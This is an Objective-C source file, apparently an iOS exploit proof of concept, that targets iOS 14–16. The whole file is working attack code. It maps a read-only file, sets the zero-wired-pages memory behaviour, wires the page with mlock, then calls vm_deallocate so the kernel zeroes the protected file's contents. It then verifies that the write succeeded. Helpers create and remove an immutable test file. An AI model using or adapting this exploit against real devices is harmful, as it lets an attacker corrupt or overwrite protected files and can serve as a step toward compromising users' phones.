// 作者：有问题联系～ pxx917144686

#import "ExploitCore.h"
#import <mach/mach.h>
#import <sys/mman.h>
#import <fcntl.h>
#import <sys/stat.h>
#import <dlfcn.h>
#import <errno.h>

// 定义常量
#define EXPLOIT_SUCCESS 0
#define EXPLOIT_FAILED -1
#define PAGE_SIZE 4096

@implementation ExploitCore

+ (instancetype)sharedInstance {
    static ExploitCore *instance = nil;
    static dispatch_once_t onceToken;
    dispatch_once(&onceToken, ^{
        instance = [[self alloc] init];
    });
    return instance;
}

- (void)prepareExploit {
    NSLog(@"[+] 准备漏洞利用环境");
    _exploitStatus = @"准备中...";
    _isExploitEnabled = [self checkDeviceVulnerability];
}

- (BOOL)checkDeviceVulnerability {
    // 检查设备是否可能受到漏洞影响
    NSLog(@"[+] 检查设备漏洞状态");
    
    // 获取iOS版本
    NSOperatingSystemVersion version = [[NSProcessInfo processInfo] operatingSystemVersion];
    
    // 检测是否为可能受影响的版本 (iOS 14.x - 16.x)
    if ((version.majorVersion >= 14 && version.majorVersion <= 16)) {
        _exploitStatus = @"设备可能受影响";
        return YES;
    } else {
        _exploitStatus = @"设备可能不受影响";
        return NO;
    }
}

- (void)runExploitWithPath:(NSString *)path completion:(void (^)(BOOL success, NSString *message))completion {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
        NSLog(@"[*] 开始执行漏洞利用: %@", path);
        self->_exploitStatus = @"正在利用漏洞...";
        
        int result = [self executeExploit:[path UTF8String]];
        
        if (result == EXPLOIT_SUCCESS) {
            self->_exploitStatus = @"漏洞利用成功";
            NSLog(@"[+] 漏洞利用成功!");
            dispatch_async(dispatch_get_main_queue(), ^{
                completion(YES, @"文件已成功修改");
            });
        } else {
            self->_exploitStatus = @"漏洞利用失败";
            NSLog(@"[-] 漏洞利用失败");
            dispatch_async(dispatch_get_main_queue(), ^{
                completion(NO, [NSString stringWithFormat:@"错误代码: %d", result]);
            });
        }
    });
}

- (int)executeExploit:(const char *)path {
    // 检查文件是否存在
    if (access(path, F_OK) != 0) {
        NSLog(@"[-] 文件不存在: %s", path);
        return EXPLOIT_FAILED - 1;
    }
    
    // 检查文件是否为只读
    struct stat fileStat;
    if (stat(path, &fileStat) != 0) {
        NSLog(@"[-] 无法获取文件信息: %s", path);
        return EXPLOIT_FAILED - 2;
    }
    
    NSLog(@"[+] 目标文件权限: %o", fileStat.st_mode & 0777);
    
    // 映射文件
    void* page = [self mapFileReadOnly:path];
    if (page == MAP_FAILED) {
        return EXPLOIT_FAILED - 3;
    }
    
    // 保存原始内容用于验证
    char originalContent[128] = {0};
    memcpy(originalContent, page, sizeof(originalContent) > PAGE_SIZE ? PAGE_SIZE : sizeof(originalContent));
    NSLog(@"[+] 文件前%lu字节内容: %.*s", sizeof(originalContent), (int)sizeof(originalContent), originalContent);
    
    // 设置内存行为
    kern_return_t kr = [self setMemoryBehavior:page];
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 设置内存行为失败: %s", mach_error_string(kr));
        return EXPLOIT_FAILED - 4;
    }
    
    // 锁定内存
    if (![self wireMemory:page]) {
        return EXPLOIT_FAILED - 5;
    }
    
    // 解除分配(关键步骤)
    if (![self deallocateMemory:page]) {
        return EXPLOIT_FAILED - 6;
    }
    
    // 验证漏洞是否生效
    NSLog(@"[*] 尝试重新打开文件验证更改");
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        NSLog(@"[-] 无法重新打开文件验证更改");
        return EXPLOIT_FAILED - 7;
    }
    
    char newContent[128] = {0};
    ssize_t bytesRead = read(fd, newContent, sizeof(newContent));
    close(fd);
    
    if (bytesRead > 0) {
        NSLog(@"[+] 读取了 %zd 字节", bytesRead);
        NSLog(@"[+] 修改后内容: %.*s", (int)bytesRead, newContent);
        
        // 检查内容是否包含零字节(被清零)
        BOOL hasZeros = NO;
        for (int i = 0; i < bytesRead; i++) {
            if (newContent[i] == 0 && originalContent[i] != 0) {
                hasZeros = YES;
                break;
            }
        }
        
        if (hasZeros) {
            NSLog(@"[+] 验证成功: 文件内容已被清零");
            return EXPLOIT_SUCCESS;
        } else {
            NSLog(@"[-] 验证失败: 文件内容未变化");
            return EXPLOIT_FAILED - 8;
        }
    }
    
    return EXPLOIT_FAILED;
}

- (void *)mapFileReadOnly:(const char *)path {
    NSLog(@"[*] 正在映射文件: %s", path);
    
    int fd = open(path, O_RDONLY);
    if (fd == -1) {
        NSLog(@"[-] 打开文件失败: %s", strerror(errno));
        return MAP_FAILED;
    }
    
    void* mapped = mmap(0, PAGE_SIZE, PROT_READ, MAP_FILE | MAP_SHARED, fd, 0);
    close(fd);
    
    if (mapped == MAP_FAILED) {
        NSLog(@"[-] 映射文件失败: %s", strerror(errno));
        return MAP_FAILED;
    }
    
    NSLog(@"[+] 成功映射文件到地址: 0x%016llx", (uint64_t)mapped);
    return mapped;
}

- (kern_return_t)setMemoryBehavior:(void *)page {
    NSLog(@"[*] 设置内存行为 VM_BEHAVIOR_ZERO_WIRED_PAGES");
    
    // VM_BEHAVIOR_ZERO_WIRED_PAGES 在不同iOS版本可能有所不同
    // 通常值为7
    int VM_BEHAVIOR_ZERO_WIRED_PAGES = 7;
    
    kern_return_t kr = vm_behavior_set(mach_task_self(),
                                (vm_address_t)page,
                                PAGE_SIZE,
                                VM_BEHAVIOR_ZERO_WIRED_PAGES);
    
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] 设置内存行为失败: %s", mach_error_string(kr));
        return kr;
    }
    
    NSLog(@"[+] 成功设置内存行为");
    return KERN_SUCCESS;
}

- (BOOL)wireMemory:(void *)page {
    NSLog(@"[*] 正在锁定内存");
    
    // 使用mlock锁定内存 (不需要root权限)
    int result = mlock(page, PAGE_SIZE);
    if (result != 0) {
        NSLog(@"[-] mlock失败: %s", strerror(errno));
        return NO;
    }
    
    NSLog(@"[+] 成功锁定内存");
    return YES;
}

- (BOOL)deallocateMemory:(void *)page {
    NSLog(@"[*] 正在解除内存映射");
    
    kern_return_t kr = vm_deallocate(mach_task_self(),
                              (vm_address_t)page,
                              PAGE_SIZE);
    
    if (kr != KERN_SUCCESS) {
        NSLog(@"[-] vm_deallocate失败: %s", mach_error_string(kr));
        return NO;
    }
    
    NSLog(@"[+] 成功解除内存映射，触发漏洞");
    return YES;
}

- (NSString *)createTestFile {
    NSLog(@"[*] 创建测试文件");
    
    // 创建测试目录
    NSString *documentsDir = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
    NSString *testDir = [documentsDir stringByAppendingPathComponent:@"ExploitTest"];
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    if (![fileManager fileExistsAtPath:testDir]) {
        [fileManager createDirectoryAtPath:testDir withIntermediateDirectories:YES attributes:nil error:nil];
    }
    
    // 创建测试文件
    NSString *testFile = [testDir stringByAppendingPathComponent:@"test.txt"];
    
    // 填充测试数据 (类似原始PoC中的全部是A的文件)
    NSMutableData *testData = [NSMutableData dataWithCapacity:0x8000];
    char testChar = 'A';
    for (int i = 0; i < 0x8000; i++) {
        [testData appendBytes:&testChar length:1];
    }
    
    // 写入文件
    [testData writeToFile:testFile atomically:YES];
    
    // 设置为只读
    NSDictionary *attributes = @{NSFileImmutable: @YES};
    [fileManager setAttributes:attributes ofItemAtPath:testFile error:nil];
    
    NSLog(@"[+] 测试文件已创建: %@", testFile);
    return testFile;
}

- (BOOL)removeTestFile:(NSString *)path {
    NSLog(@"[*] 清理测试文件");
    
    NSFileManager *fileManager = [NSFileManager defaultManager];
    
    // 先恢复文件可写
    NSDictionary *attributes = @{NSFileImmutable: @NO};
    [fileManager setAttributes:attributes ofItemAtPath:path error:nil];
    
    // 删除文件
    NSError *error;
    BOOL success = [fileManager removeItemAtPath:path error:&error];
    
    if (!success) {
        NSLog(@"[-] 删除文件失败: %@", error.localizedDescription);
        return NO;
    }
    
    NSLog(@"[+] 测试文件已删除");
    return YES;
}

@end
